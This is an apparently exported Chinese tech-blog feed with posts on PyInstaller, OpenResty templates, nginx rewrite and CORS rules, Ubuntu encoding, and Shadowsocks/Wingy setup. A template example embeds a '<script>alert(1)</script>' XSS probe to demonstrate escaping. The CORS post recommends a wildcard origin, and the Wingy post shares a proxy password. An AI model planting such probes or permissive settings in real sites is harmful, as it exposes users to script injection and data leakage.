xxx.py3.打包成单个文件,windows窗口程序. 执行:pyinstaller -F -w xxx.py3.加图标. 执行:pyinstaller -F -w -i x:\xxx\xxx\xx.ico xxx.py 注意:1.程序只能在英文目录下打包,并在英文路径下运行2.打包后的名字必须用英文名字 QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mac os 卸载向日葵软件]]></title>
    <url>%2F2017%2F05%2F10%2F19_MAC%E5%8D%B8%E8%BD%BD%E5%90%91%E6%97%A5%E8%91%B5%2F</url>
    <content type="text"><![CDATA[mac os 卸载向日葵软件QQ群：397745473 mac os 卸载向日葵软件你这是耍流氓.给了安装不给卸载.还自动启动. 卸载mac os 卸载向日葵软件的方法:1.查安装目录1ps -ef |grep Sun 找到后直接用root用户册除就行了. QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>xiangrikui</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[openresty用mvc框架配置测试]]></title>
    <url>%2F2017%2F05%2F04%2F13_openresty%E7%94%A8mvc%E6%A1%86%E6%9E%B6%E9%85%8D%E7%BD%AE%E6%B5%8B%E8%AF%95%2F</url>
    <content type="text"><![CDATA[openresty mvc框架常用Lua开发库3-模板渲染动态web网页开发是Web开发中一个常见的场景，比如像京东商品详情页，其页面逻辑是非常复杂的，需要使用模板技术来实现。而Lua中也有许多模板引擎，如目前我在使用的lua-resty-template，可以渲染很复杂的页面，借助LuaJIT其性能也是可以接受的。 如果学习过JavaEE中的servlet和JSP的话，应该知道JSP模板最终会被翻译成Servlet来执行；而lua-resty-template模板引擎可以认为是JSP，其最终会被翻译成Lua代码，然后通过ngx.print输出。 而lua-resty-template和大多数模板引擎是类似的，大体内容有：模板位置：从哪里查找模板；变量输出/转义：变量值输出；代码片段：执行代码片段，完成如if/else、for等复杂逻辑，调用对象函数/方法；注释：解释代码片段含义；include：包含另一个模板片段；其他：lua-resty-template还提供了不需要解析片段、简单布局、可复用的代码块、宏指令等支持。 下载lua-resty-template12345cd /usr/example/lualib/resty/ wget https://raw.githubusercontent.com/bungle/lua-resty-template/master/lib/resty/template.lua mkdir /usr/example/lualib/resty/html cd /usr/example/lualib/resty/html wget https://raw.githubusercontent.com/bungle/lua-resty-template/master/lib/resty/template/html.lua 模板位置定义我们需要告诉lua-resty-template去哪儿加载我们的模块，此处可以通过set指令定义template_location、template_root或者从root指令定义的位置加载。如我们可以在example.conf配置文件的server部分定义 1234#first match ngx location set $template_location &quot;/templates&quot;; #then match root read file set $template_root &quot;/usr/example/templates&quot;; 也可以通过在server部分定义root指令root /usr/example/templates; 其顺序是123456789101112local function load_ngx(path) local file, location = path, ngx_var.template_location if file:sub(1) == &quot;/&quot; then file = file:sub(2) end if location and location ~= &quot;&quot; then if location:sub(-1) == &quot;/&quot; then location = location:sub(1, -2) end local res = ngx_capture(location .. &apos;/&apos; .. file) if res.status == 200 then return res.body end end local root = ngx_var.template_root or ngx_var.document_root if root:sub(-1) == &quot;/&quot; then root = root:sub(1, -2) end return read_file(root .. &quot;/&quot; .. file) or path end 1、通过ngx.location.capture从template_location查找，如果找到（状态为为200）则使用该内容作为模板；此种方式是一种动态获取模板方式；2、如果定义了template_root，则从该位置通过读取文件的方式加载模板；3、如果没有定义template_root，则默认从root指令定义的document_root处加载模板。 此处建议首先template_root，如果实在有问题再使用template_location，尽量不要通过root指令定义的document_root加载，因为其本身的含义不是给本模板引擎使用的。 接下来定义模板位置 mkdir /usr/example/templates mkdir /usr/example/templates2 example.conf配置server部分123456789#first match ngx location set $template_location &quot;/templates&quot;; #then match root read file set $template_root &quot;/usr/example/templates&quot;; location /templates &#123; internal; alias /usr/example/templates2; &#125; 首先查找/usr/example/template2，找不到会查找/usr/example/templates。 然后创建两个模板文件1vim /usr/example/templates2/t1.html 内容为 template21vim /usr/example/templates/t1.html 内容为1template1 12mkdir -p /usr/example/lua/vi /usr/example/lua/test_template_1.lua 12local template = require(&quot;resty.template&quot;) template.render(&quot;t1.html&quot;) 访问如http://192.168.1.2/lua_template_1将看到template2输出。然后rm /usr/example/templates2/t1.html，reload nginx将看到template1输出。 接下来的测试我们会把模板文件都放到/usr/example/templates下。 API使用模板引擎目的就是输出响应内容；主要用法两种：直接通过ngx.print输出或者得到模板渲染之后的内容按照想要的规则输出。 1、test_template_2.lua1vi /usr/example/lua/test_template_2.lua 内容:12345678910111213141516local template = require(&quot;resty.template&quot;) --是否缓存解析后的模板，默认true template.caching(true) --渲染模板需要的上下文(数据) local context = &#123;title = &quot;title&quot;&#125; --渲染模板 template.render(&quot;t1.html&quot;, context) ngx.say(&quot;&lt;br/&gt;&quot;) --编译得到一个lua函数 local func = template.compile(&quot;t1.html&quot;) --执行函数，得到渲染之后的内容 local content = func(context) --通过ngx API输出 ngx.say(content) 2、examle.conf配置文件12345location /lua_template_2 &#123; default_type &apos;text/html&apos;; lua_code_cache on; content_by_lua_file /usr/example/lua/test_template_2.lua; &#125; 使用示例1、test_template_3.lua1234567891011121314151617local template = require(&quot;resty.template&quot;) local context = &#123; title = &quot;测试&quot;, name = &quot;张三&quot;, description = &quot;&lt;script&gt;alert(1);&lt;/script&gt;&quot;, age = 20, hobby = &#123;&quot;电影&quot;, &quot;音乐&quot;, &quot;阅读&quot;&#125;, score = &#123;语文 = 90, 数学 = 80, 英语 = 70&#125;, score2 = &#123; &#123;name = &quot;语文&quot;, score = 90&#125;, &#123;name = &quot;数学&quot;, score = 80&#125;, &#123;name = &quot;英语&quot;, score = 70&#125;, &#125; &#125; template.render(&quot;t3.html&quot;, context) 请确认文件编码为UTF-8；context即我们渲染模板使用的数据。 2、模板文件/usr/example/templates/t3.html123456789101112131415161718192021222324252627282930&#123;(header.html)&#125; &lt;body&gt; &#123;# 不转义变量输出 #&#125; 姓名：&#123;* string.upper(name) *&#125;&lt;br/&gt; &#123;# 转义变量输出 #&#125; 简介：&#123;&#123;description&#125;&#125;&lt;br/&gt; &#123;# 可以做一些运算 #&#125; 年龄: &#123;* age + 1 *&#125;&lt;br/&gt; &#123;# 循环输出 #&#125; 爱好： &#123;% for i, v in ipairs(hobby) do %&#125; &#123;% if i &gt; 1 then %&#125;，&#123;% end %&#125; &#123;* v *&#125; &#123;% end %&#125;&lt;br/&gt; 成绩： &#123;% local i = 1; %&#125; &#123;% for k, v in pairs(score) do %&#125; &#123;% if i &gt; 1 then %&#125;，&#123;% end %&#125; &#123;* k *&#125; = &#123;* v *&#125; &#123;% i = i + 1 %&#125; &#123;% end %&#125;&lt;br/&gt; 成绩2： &#123;% for i = 1, #score2 do local t = score2[i] %&#125; &#123;% if i &gt; 1 then %&#125;，&#123;% end %&#125; &#123;* t.name *&#125; = &#123;* t.score *&#125; &#123;% end %&#125;&lt;br/&gt; &#123;# 中间内容不解析 #&#125; &#123;-raw-&#125;&#123;(file)&#125;&#123;-raw-&#125; &#123;(footer.html)&#125; include_file：包含另一个模板文件； var ：变量输出； var ：变量转义输出； code ：代码片段； comment ：注释；raw：中间的内容不会解析，作为纯文本输出； 模板最终被转换为Lua代码进行执行，所以模板中可以执行任意Lua代码。 3、example.conf配置文件 12345location /lua_template_3 &#123; default_type &apos;text/html&apos;; lua_code_cache on; content_by_lua_file /usr/example/lua/test_template_3.lua; &#125; 访问如http://192.168.1.2/lua_template_3进行测试。 基本的模板引擎使用到此就介绍完了 参考:http://jinnianshilongnian.iteye.com/blog/2187775 使用Nginx+Lua(OpenResty)开发高性能Web应用第一章 安装Nginx+Lua开发环境第二章 Nginx+Lua开发入门第三章 Redis/SSDB+Twemproxy安装与使用第四章 Lua模块开发第五章 常用Lua开发库1-redis、mysql、http客户端第五章 常用Lua开发库2-JSON库、编码转换、字符串处理第五章 常用Lua开发库3-模板渲染第六章 Web开发实战1——HTTP服务第七章 Web开发实战2——商品详情页第八章 流量复制/AB测试/协程 http://geek.csdn.net/user/publishlist/lzz957748332 openresty官网：http://openresty.org/（中文版：http://openresty.org/cn/） Nginx教程：https://openresty.org/download/agentzh-nginx-tutorials-zhcn.html lua5.1文档：http://www.lua.org/manual/5.1/ openresty最佳实践：https://www.gitbook.com/book/moonbingbing/openresty-best-practices/details Nginx-lua模块文档：https://github.com/openresty/lua-nginx-module https://idevz.gitbooks.io/vanilla-zh/content/https://github.com/idevz/vanillahttp://www.stuq.org/course/1015/study https://moonbingbing.gitbooks.io/openresty-best-practices/content/base/web_evolution.html https://github.com/362228416/openresty-web-devhttp://openresty.org/download/agentzh-nginx-tutorials-zhcn.html QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>openresty</tag>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu 乱码]]></title>
    <url>%2F2017%2F05%2F04%2F14_ubuntu%E4%B9%B1%E7%A0%81%E7%BB%88%E7%BA%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[最烦乱码了,今天又碰到了.解决Linux(Ubuntu)中文乱码，添加中文字符集 添加中文字符编码：1$sudo vim /var/lib/locales/supported.d/local #添加下面的中文字符集123zh_CN.GBK GBK zh_CN.GB2312 GB2312 zh_CN.GB18030 GB18030 使其生效：1$sudo dpkg-reconfigure locales vim乱码打开vim的配置文件，位置在/etc/vim/vimrc在其中加入123set fileencodings=utf-8,gb2312,gbk,gb18030 set termencoding=utf-8 set encoding=prc 保存退出source /etc/vim/vimrc 此时vim就能正确显示中文了。 pdf乱码1$sudo apt-get install xpdf-chinese-simplifiedxpdf-chinese-traditional #安装pdf的中文字体 1234$sudo apt-get install poppler-data #安装解决pdf中文显示乱码的软件 $cd /etc/fonts/conf.d $sudo cp 49-sansserif.conf 49-sansserif.conf_backup #先备份下 $sudo rm 49-sansserif.conf #删除 在打开pdf文件，就能呢个正常显示中文了 gedit乱码缺省配置下，用 Ubuntu 的文本编辑器（gedit）打开 GB18030/GBK/GB2312 等类型的中文编码文本文件时，将会出现乱码。 出现这种情况的原因是，gedit 使用一个编码匹配列表，只有在这个列表中的编码才会进行匹配，不在这个列表中的编码将显示为乱码。您要做的就是将 GB18030 加入这个匹配列表。 命令行方式，适用于所有 Ubuntu 用户。复制以下命令到终端中，然后回车即可： gconftool-2 –set –type=list –list-type=string /apps/gedit-2/preferences/encodings/auto_detected “[UTF-8,CURRENT,GB18030,BIG5-HKSCS,UTF-16]” 图形化方式，适用于 Ubuntu 用户，而不适用于 KUbuntu/XUbuntu 用户。您可以遵循以下步骤，使您的 gedit 正确显示中文编码文件。 按下 Alt-F2，打开“运行应用程序”对话框。在文本框中键入“gconf-editor”，并按下回车键，打开“配置编辑器”。展开左边的树节点，找到 /apps/gedit-2/preferences/encodings 节点并单击它。双击右边的 auto_detected 键，打开“编辑键”对话框。单击列表右边的“添加”按钮，输入“GB18030”，单击确定按钮。列表的最底部新增加了一个“GB18030”。单击选中它，并单击右边的 “向上” 按钮直到 “GB18030” 位于列表的顶部为止。单击确定按钮，关闭配置编辑器。gedit3.x版本设置 终端输入dconf-editor 展开org/gnome/gedit/preferences/encodings auto-detected的value中加入’GB18030′，加在uft8后面； show-in-menu的value中加入’GB18030′ 现在，您的 gedit 应该能够顺利打开 GB18030 编码的文本文件了。 gedit 3.X版本命令设置：gsettings set org.gnome.gedit.preferences.encodings auto-detected “[‘UTF-8’,’GB18030’,’GB2312’,’GBK’,’BIG5’,’CURRENT’,’UTF-16’]” QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[lua生成随机数]]></title>
    <url>%2F2017%2F05%2F04%2F21_lua%E7%94%9F%E6%88%90%E9%9A%8F%E6%9C%BA%E6%95%B0%2F</url>
    <content type="text"><![CDATA[今天用到lua生成随机数的方法,生简单. 12math.randomseed(os.time())local ranNumber=math.random(1,99999999) 第二句必须有哦. QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>openresty</tag>
        <tag>lua</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[openresty使用MVC模板]]></title>
    <url>%2F2017%2F05%2F04%2F22_openresty%E4%BD%BF%E7%94%A8MVC%E6%A8%A1%E6%9D%BF%2F</url>
    <content type="text"><![CDATA[openresty使用MVC模板我是用默认路径安装了openresty.就是直接用.configure&amp;&amp;make&amp;&amp;make install安装完成的.其他的什么都不改. 官方说明:https://github.com/bungle/lua-resty-templatelua-resty-template 下载安装12LuaRocks安装luarocks install lua-resty-template 如果没有luarocks可以用yum或者apt安装一个 配置nginx设置两个变量就行了:template_root放在server {下面1set $template_root /usr/local/openresty/nginx/html/templates template_location放到location / {下面1set $template_location /templates 配置方式一用Using document_root的方法配置:1234567891011http &#123; server &#123; location / &#123; root html; content_by_lua &apos; local template = require &quot;resty.template&quot; template.render(&quot;view.html&quot;, &#123; message = &quot;Hello, World!&quot; &#125;) &apos;; &#125; &#125;&#125; 配置方式二(推荐)用Using template_root 的方法配置123456789101112http &#123; server &#123; set $template_root /usr/local/openresty/nginx/html/templates; location / &#123; root html; content_by_lua &apos; local template = require &quot;resty.template&quot; template.render(&quot;view.html&quot;, &#123; message = &quot;Hello, World!&quot; &#125;) &apos;; &#125; &#125;&#125; 配置方式三用Using template_location的方法配12345678910111213141516http &#123; server &#123; set $template_location /templates; location / &#123; root html; content_by_lua &apos; local template = require &quot;resty.template&quot; template.render(&quot;view.html&quot;, &#123; message = &quot;Hello, World!&quot; &#125;) &apos;; &#125; location /templates &#123; internal; alias html/templates/; &#125; &#125;&#125; 123mkdir -p /usr/local/openresty/nginx/html/templatescd /usr/local/openresty/nginx/html/templatesvi view.html 文件内容如下:123456&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt; &lt;h1&gt;&#123;&#123;message&#125;&#125;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; 这样就可以用模板操作了.QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>openresty</tag>
        <tag>lua</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx location 和 rewrite 规则的书写方法]]></title>
    <url>%2F2017%2F05%2F01%2F12_nginx_location_and_rewrite%2F</url>
    <content type="text"><![CDATA[location正则写法一个示例：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051location = / &#123; # 精确匹配 / ，主机名后面不能带任何字符串 [ configuration A ] &#125;location / &#123; # 因为所有的地址都以 / 开头，所以这条规则将匹配到所有请求 # 但是正则和最长字符串会优先匹配 [ configuration B ] &#125;location /documents/ &#123; # 匹配任何以 /documents/ 开头的地址，匹配符合以后，还要继续往下搜索 # 只有后面的正则表达式没有匹配到时，这一条才会采用这一条 [ configuration C ] &#125;location ~ /documents/Abc &#123; # 匹配任何以 /documents/ 开头的地址，匹配符合以后，还要继续往下搜索 # 只有后面的正则表达式没有匹配到时，这一条才会采用这一条 [ configuration CC ] &#125;location ^~ /images/ &#123; # 匹配任何以 /images/ 开头的地址，匹配符合以后，停止往下搜索正则，采用这一条。 [ configuration D ] &#125;location ~* \.(gif|jpg|jpeg)$ &#123; # 匹配所有以 gif,jpg或jpeg 结尾的请求 # 然而，所有请求 /images/ 下的图片会被 config D 处理，因为 ^~ 到达不了这一条正则 [ configuration E ] &#125;location /images/ &#123; # 字符匹配到 /images/，继续往下，会发现 ^~ 存在 [ configuration F ] &#125;location /images/abc &#123; # 最长字符匹配到 /images/abc，继续往下，会发现 ^~ 存在 # F与G的放置顺序是没有关系的 [ configuration G ] &#125;location ~ /images/abc/ &#123; # 只有去掉 config D 才有效：先最长匹配 config G 开头的地址，继续往下搜索，匹配到这一条正则，采用 [ configuration H ] &#125;location ~* /js/.*/\.js 已=开头表示精确匹配 如 A 中只匹配根目录结尾的请求，后面不能带任何字符串。 ^~ 开头表示uri以某个常规字符串开头，不是正则匹配 ~ 开头表示区分大小写的正则匹配; ~* 开头表示不区分大小写的正则匹配 / 通用匹配, 如果没有其它匹配,任何请求都会匹配到 顺序 no优先级： (location =) &gt; (location 完整路径) &gt; (location ^~ 路径) &gt; (location ~,~* 正则顺序) &gt; (location 部分起始路径) &gt; (/) 上面的匹配结果 按照上面的location写法，以下的匹配示例成立： / -&gt; config A 精确完全匹配，即使/index.html也匹配不了 /downloads/download.html -&gt; config B 匹配B以后，往下没有任何匹配，采用B /images/1.gif -&gt; configuration D 匹配到F，往下匹配到D，停止往下 /images/abc/def -&gt; config D 最长匹配到G，往下匹配D，停止往下 你可以看到 任何以/images/开头的都会匹配到D并停止，FG写在这里是没有任何意义的，H是永远轮不到的，这里只是为了说明匹配顺序 /documents/document.html -&gt; config C 匹配到C，往下没有任何匹配，采用C /documents/1.jpg -&gt; configuration E 匹配到C，往下正则匹配到E /documents/Abc.jpg -&gt; config CC 最长匹配到C，往下正则顺序匹配到CC，不会往下到E 实际使用建议所以实际使用中，个人觉得至少有三个匹配规则定义，如下： #直接匹配网站根，通过域名访问网站首页比较频繁，使用这个会加速处理，官网如是说。 #这里是直接转发给后端应用服务器了，也可以是一个静态首页 第一个必选规则location = / { proxy_pass http://tomcat:8080/index} 第二个必选规则是处理静态文件请求，这是nginx作为http服务器的强项有两种配置模式，目录匹配或后缀匹配,任选其一或搭配使用location ^~ /static/ { root /webroot/static/;}location ~* .(gif|jpg|jpeg|png|css|js|ico)$ { root /webroot/res/;} #第三个规则就是通用规则，用来转发动态请求到后端应用服务器 #非静态文件请求就默认是动态请求，自己根据实际把握 #毕竟目前的一些框架的流行，带.php,.jsp后缀的情况很少了location / { proxy_pass http://tomcat:8080/}http://tengine.taobao.org/book/chapter_02.htmlhttp://nginx.org/en/docs/http/ngx_http_rewrite_module.html Rewrite规则rewrite功能就是，使用nginx提供的全局变量或自己设置的变量，结合正则表达式和标志位实现url重写以及重定向。rewrite只能放在server{},location{},if{}中，并且只能对域名后边的除去传递的参数外的字符串起作用，例如 http://seanlook.com/a/we/index.php?id=1&amp;u=str 只对/a/we/index.php重写。语法rewrite regex replacement [flag]; 如果相对域名或参数字符串起作用，可以使用全局变量匹配，也可以使用proxy_pass反向代理。 表明看rewrite和location功能有点像，都能实现跳转，主要区别在于rewrite是在同一域名内更改获取资源的路径，而location是对一类路径做控制访问或反向代理，可以proxy_pass到其他机器。很多情况下rewrite也会写在location里，它们的执行顺序是： 执行server块的rewrite指令 执行location匹配 执行选定的location中的rewrite指令如果其中某步URI被重写，则重新循环执行1-3，直到找到真实存在的文件；循环超过10次，则返回500 Internal Server Error错误。flag标志位 last : 相当于Apache的[L]标记，表示完成rewrite break : 停止执行当前虚拟主机的后续rewrite指令集 redirect : 返回302临时重定向，地址栏会显示跳转后的地址 permanent : 返回301永久重定向，地址栏会显示跳转后的地址 因为301和302不能简单的只返回状态码，还必须有重定向的URL，这就是return指令无法返回301,302的原因了。这里 last 和 break 区别有点难以理解： last一般写在server和if中，而break一般使用在location中 last不终止重写后的url匹配，即新的url会再从server走一遍匹配流程，而break终止重写后的匹配 break和last都能组织继续执行后面的rewrite指令 if指令与全局变量if判断指令语法为if(condition){…}，对给定的条件condition进行判断。如果为真，大括号内的rewrite指令将被执行，if条件(conditon)可以是如下任何内容： 当表达式只是一个变量时，如果值为空或任何以0开头的字符串都会当做false 直接比较变量和内容时，使用=或!= ~正则表达式匹配，~*不区分大小写的匹配，!~区分大小写的不匹配1234-f和!-f用来判断是否存在文件-d和!-d用来判断是否存在目录-e和!-e用来判断是否存在文件或目录-x和!-x用来判断文件是否可执行 例如：12345678910111213141516171819202122232425262728293031if ($http_user_agent ~ MSIE) &#123; rewrite ^(.*)$ /msie/$1 break;&#125; //如果UA包含&quot;MSIE&quot;，rewrite请求到/msid/目录下if ($http_cookie ~* &quot;id=([^;]+)(?:;|$)&quot;) &#123; set $id $1; &#125; //如果cookie匹配正则，设置变量$id等于正则引用部分if ($request_method = POST) &#123; return 405;&#125; //如果提交方法为POST，则返回状态405（Method not allowed）。return不能返回301,302if ($slow) &#123; limit_rate 10k;&#125; //限速，$slow可以通过 set 指令设置if (!-f $request_filename)&#123; break; proxy_pass http://127.0.0.1; &#125; //如果请求的文件名不存在，则反向代理到localhost 。这里的break也是停止rewrite检查if ($args ~ post=140)&#123; rewrite ^ http://example.com/ permanent;&#125; //如果query string中包含&quot;post=140&quot;，永久重定向到example.comlocation ~* \.(gif|jpg|png|swf|flv)$ &#123; valid_referers none blocked www.jefflei.com www.leizhenfang.com; if ($invalid_referer) &#123; return 404; &#125; //防盗链&#125; 全局变量下面是可以用作if判断的全局变量 $args ： #这个变量等于请求行中的参数，同$query_string $content_length ： 请求头中的Content-length字段。 $content_type ： 请求头中的Content-Type字段。 $document_root ： 当前请求在root指令中指定的值。 $host ： 请求主机头字段，否则为服务器名称。 $http_user_agent ： 客户端agent信息 $http_cookie ： 客户端cookie信息 $limit_rate ： 这个变量可以限制连接速率。 $request_method ： 客户端请求的动作，通常为GET或POST。 $remote_addr ： 客户端的IP地址。 $remote_port ： 客户端的端口。 $remote_user ： 已经经过Auth Basic Module验证的用户名。 $request_filename ： 当前请求的文件路径，由root或alias指令与URI请求生成。 $scheme ： HTTP方法（如http，https）。 $server_protocol ： 请求使用的协议，通常是HTTP/1.0或HTTP/1.1。 $server_addr ： 服务器地址，在完成一次系统调用后可以确定这个值。 $server_name ： 服务器名称。 $server_port ： 请求到达服务器的端口号。 $request_uri ： 包含请求参数的原始URI，不包含主机名，如：”/foo/bar.php?arg=baz”。 $uri ： 不带请求参数的当前URI，$uri不包含主机名，如”/foo/bar.html”。 $document_uri ： 与$uri相同。 例：http://localhost:88/test1/test2/test.php$host：localhost$server_port：88$request_uri：http://localhost:88/test1/test2/test.php$document_uri：/test1/test2/test.php$document_root：/var/www/html$request_filename：/var/www/html/test1/test2/test.php 常用正则1234567891011. ： 匹配除换行符以外的任意字符? ： 重复0次或1次+ ： 重复1次或更多次* ： 重复0次或更多次\d ：匹配数字^ ： 匹配字符串的开始$ ： 匹配字符串的介绍&#123;n&#125; ： 重复n次&#123;n,&#125; ： 重复n次或更多次[c] ： 匹配单个字符c[a-z] ： 匹配a-z小写字母的任意一个 小括号()之间匹配的内容，可以在后面通过$1来引用，$2表示的是前面第二个()里的内容。正则里面容易让人困惑的是\转义特殊字符。 rewrite实例例1：12345678910111213141516171819202122232425262728293031http &#123; # 定义image日志格式 log_format imagelog &apos;[$time_local] &apos; $image_file &apos; &apos; $image_type &apos; &apos; $body_bytes_sent &apos; &apos; $status; # 开启重写日志 rewrite_log on; server &#123; root /home/www; location / &#123; # 重写规则信息 error_log logs/rewrite.log notice; # 注意这里要用‘’单引号引起来，避免&#123;&#125; rewrite &apos;^/images/([a-z]&#123;2&#125;)/([a-z0-9]&#123;5&#125;)/(.*)\.(png|jpg|gif)$&apos; /data?file=$3.$4; # 注意不能在上面这条规则后面加上“last”参数，否则下面的set指令不会执行 set $image_file $3; set $image_type $4; &#125; location /data &#123; # 指定针对图片的日志格式，来分析图片类型和大小 access_log logs/images.log mian; root /data/images; # 应用前面定义的变量。判断首先文件在不在，不在再判断目录在不在，如果还不在就跳转到最后一个url里 try_files /$arg_file /image404.html; &#125; location = /image404.html &#123; # 图片不存在返回特定的信息 return 404 &quot;image not found\n&quot;; &#125;&#125; 对形如/images/ef/uh7b3/test.png的请求，重写到/data?file=test.png，于是匹配到location /data，先看/data/images/test.png文件存不存在，如果存在则正常响应，如果不存在则重写tryfiles到新的image404 location，直接返回404状态码。例2：1rewrite ^/images/(.*)_(\d+)x(\d+)\.(png|jpg|gif)$ /resizer/$1.$4?width=$2&amp;height=$3? last; 对形如/images/bla_500x400.jpg的文件请求，重写到/resizer/bla.jpg?width=500&amp;height=400地址，并会继续尝试匹配location。例3：见 ssl部分页面加密 。 参考 http://www.nginx.cn/216.htmlhttp://www.ttlsa.com/nginx/nginx-rewriting-rules-guide/《老僧系列nginx之rewrite规则快速上手.pdf》http://fantefei.blog.51cto.com/2229719/919431原文链接地址：http://seanlook.com/2015/05/17/nginx-location-rewrite/ QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>location</tag>
        <tag>rewrite</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx直接返回值给ajax调用]]></title>
    <url>%2F2017%2F04%2F29%2F10_Nginx%E7%9B%B4%E6%8E%A5%E8%BF%94%E5%9B%9E%E5%80%BC%E7%BB%99ajax%E8%B0%83%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Nginx直接返回值给ajax调用的方法 js调用代码 #:1234567891011121314151617function getDomain()&#123; var url="http://47.81.12.22/get_t.do";$.ajax(&#123;type : "get",url : url,async: false,dataType: "text",success : function callback(result) &#123;mydoain=result;&#125;,error:function()&#123; mydoain="http://www.xxx.com/"; &#125; &#125;); alert(mydoain);&#125; nginx服务器配置代码12345location = '/get_t.do' &#123;default_type text/html;add_header Access-Control-Allow-Origin *;return 200 'http://www.test.com/';&#125; add_header Access-Control-Allow-Origin *;这一句很重要,不加的话取js不到结果哦.也可以 add_header Access-Control-Allow-Origin http://xxoo.com; –指定允许的url; 这里面可以加很多头部信息 nginx中配置跨域支持功能在nginx.conf中配置:12345678http &#123; ...... add_header Access-Control-Allow-Origin *; add_header Access-Control-Allow-Headers X-Requested-With; add_header Access-Control-Allow-Methods GET,POST,OPTIONS; ......&#125; 这样就可以实现GET,POST,OPTIONS的跨域请求的支持也可以 add_header Access-Control-Allow-Origin http://test.51testing.com; –指定允许的url; 配置项详细解释：w3c-Cross-Origin Resource Sharing QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx $document_uri 参数使用]]></title>
    <url>%2F2017%2F04%2F29%2F11_nginx_document_uri%2F</url>
    <content type="text"><![CDATA[$document_uri 表示访问的url现在我的需求是，访问 www.abc.com 请求到 www.abc.com/abc/在nginx配置文件中加入 1234if ($document_uri !~ &apos;abc&apos;) &#123; rewrite ^/(.*)$ http://www.abc.com/abc/$1 permanent; &#125; 而不是单独加一句 rewrite ^/(.*)$ http://www.abc.com/abc/$1 permanent;如果只加rewrite 规则，而不限定条件，那么会造成死循环。 会访问到 http://www.abc.com/abc/abc/abc/abc/.... if ($document_uri !~ ‘abc’)有何含义?若访问的网站目录不是abc，则跳转至该目录，如访问http://www.aming.com/index.php跳转至http://www.aming.com/abc/index.php QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017最新Wingy搭建技巧]]></title>
    <url>%2F2017%2F04%2F28%2F07_2017%E6%9C%80%E6%96%B0Wingy%E6%90%AD%E5%BB%BA%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[Wingy是什么?Wingy 是一个可以用来搭建科技上网的工具. 怎么使用WINGY安装Wingy APP 使用Wingy进行科学上网，首先当然是要安装Wingy这款APP了。安装地址：https://www.wingy.site/appstore.html安装过程很简单，直接在苹果的AppStore搜索Wingy，安装就可以了。(有两个版本，收费的是给老iOS准备的，免费的是新版本，都是同一个作者的作品。) 搭建自己的Wingy代理服务器教程使用Wingy给iPhone爬墙，需要一个代理服务器支持，而Wingy上面最方便的就是用Shadowsocks的代理服务器了。 购买VPS.推荐使用 Vultr (可以用支付宝付款,实用方便) http://www.vultr.com/?ref=6822051 可用的优惠码（通过我们网站的链接注册默认会赠送20美元，另外还可以试试这几个优惠码） DOMORE NGINX20 SSDVPS TGIF15 GIVEME10 WHTPROMO以上优惠码有的需要信用卡支付才有效，请自行测试。 下载SSH连接工具,推荐 用 PUTTY (小巧灵活,百度上直接有下的)1wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh 上面这条命令是下载ss一键包，复制了粘贴进putty然后回车1chmod +x shadowsocks.sh 上面这条命令是给一键包添加权限，复制了粘贴后回车。1./shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks.log ss的管理命令启动：/etc/init.d/shadowsocks start停止：/etc/init.d/shadowsocks stop重启：/etc/init.d/shadowsocks restart状态：/etc/init.d/shadowsocks status 配置文件路径：/etc/shadowsocks.json 获取SS账号服务器：freess.wingy.site 远程端口：9999 随机密码：9909 加密方式:aes-256-cfb ↓提醒：免费账号，请勿视频和下载，流量用完就暂停服务。 免费版vpn客户端下载Wingy-免费版vpn客户端 for shadowsocks &amp; shadowrocket 作者：wang xiao jun 价格：免费（免费APP，各位评价的时候要留口德，作者没义务满足你的需求。） AppStore安装链接为（iOS9.3装这个）：https://itunes.apple.com/cn/app/wingy-mian-fei-banvpn-ke-hu/id1148026741?mt=8 新版本下载地址（iOS10装这个）：https://itunes.apple.com/cn/app/wingy-proxy-for-ss-http-s/id1178584911?l=zh&amp;mt=8 您也可以直接在AppStore搜索Wingy安装。 常见问题设置Wingy全局代理和智能代理切换的方法简单解释：自动代理模式：就是Wingy内置了一份常见的被墻网站列表，只有在列表里面的网站才走代理，例如你访问google走代理，访问baidu不走代理。全局模式：所有网站都走代理，不管你是访问google还是baidu，都是通过代理访问的。 设置方法： 根据前面Wingy设置教程的步骤，重新添加一次服务器.设置完毕后，就可以通过选择节点来实现全局或者部分代理了。PS：当前版本的Wingy还不支持自定义规则，不过使用表现还是不错，相当稳定，相信作者会在后续版本中加入自定义规则等功能。免费APP，大家要多多鼓励，不要无脑喷。 Wingy安装视频教程文字讲得不够详尽的,会尽力录制一个视频教程发出来.现在正找个比较清晰的录制工具,望大家多多推荐! 